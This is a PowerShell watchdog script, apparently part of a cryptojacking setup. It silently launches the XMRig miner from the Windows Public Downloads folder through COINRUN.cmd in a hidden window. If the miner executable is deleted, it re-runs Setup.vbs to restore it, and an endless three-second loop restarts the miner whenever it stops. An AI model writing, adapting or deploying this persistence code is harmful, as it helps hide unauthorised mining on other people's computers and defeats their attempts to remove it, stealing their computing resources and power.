$xmrigPath = "C:\Users\Public\Downloads\xmrig-6.22.2\xmrig.exe"
$coinRunPath = "C:\Users\Public\Downloads\xmrig-6.22.2\COINRUN.cmd"
$setupPath = "C:\Users\Public\Downloads\Setup.vbs"
$xmrigProcessName = "xmrig"
$global:isStarting = $false

function Start-CoinRun {
    $existing = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
    if (!$existing -and !$global:isStarting) {
        $global:isStarting = $true
        Write-Host "Starting COINRUN.cmd silently..."
        $global:coinRunProcess = Start-Process -FilePath "cmd.exe" `
            -ArgumentList "/c `"$coinRunPath`"" `
            -PassThru -WindowStyle Hidden
        Start-Sleep -Seconds 5
        $global:isStarting = $false
    } else {
        Write-Host "XMRig is already running or starting. Skipped starting again."
    }
}

if (Test-Path $xmrigPath) {
    Start-CoinRun
} else {
    Write-Warning "xmrig.exe not found."
    if (Test-Path $setupPath) {
        Write-Host "Running Setup.vbs to restore xmrig..."
        Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
        while (!(Test-Path $xmrigPath)) {
            Write-Host "Waiting for xmrig.exe..."
            Start-Sleep -Seconds 3
        }
        Start-CoinRun
    } else {
        Write-Error "Setup.vbs not found at $setupPath"
    }
}

# Giám sát liên tục
while ($true) {
    if (!(Test-Path $xmrigPath)) {
        Write-Warning "xmrig.exe was deleted. Restoring..."
        if (Test-Path $setupPath) {
            Start-Process -FilePath "wscript.exe" -ArgumentList "`"$setupPath`""
            while (!(Test-Path $xmrigPath)) {
                Write-Host "Waiting for xmrig.exe to restore..."
                Start-Sleep -Seconds 3
            }
            Start-CoinRun
        } else {
            Write-Error "Setup.vbs not found: $setupPath"
        }
    }

    $xmrigRunning = Get-Process -Name $xmrigProcessName -ErrorAction SilentlyContinue
    if (-not $xmrigRunning) {
        Write-Warning "xmrig.exe not running. Restarting..."
        Start-CoinRun
    } else {
        Write-Host "xmrig.exe is running normally."
    }

    if ($global:coinRunProcess -and $global:coinRunProcess.HasExited) {
        Write-Warning "COINRUN.cmd exited. Restarting..."
        Start-CoinRun
    }

    Start-Sleep -Seconds 3
}
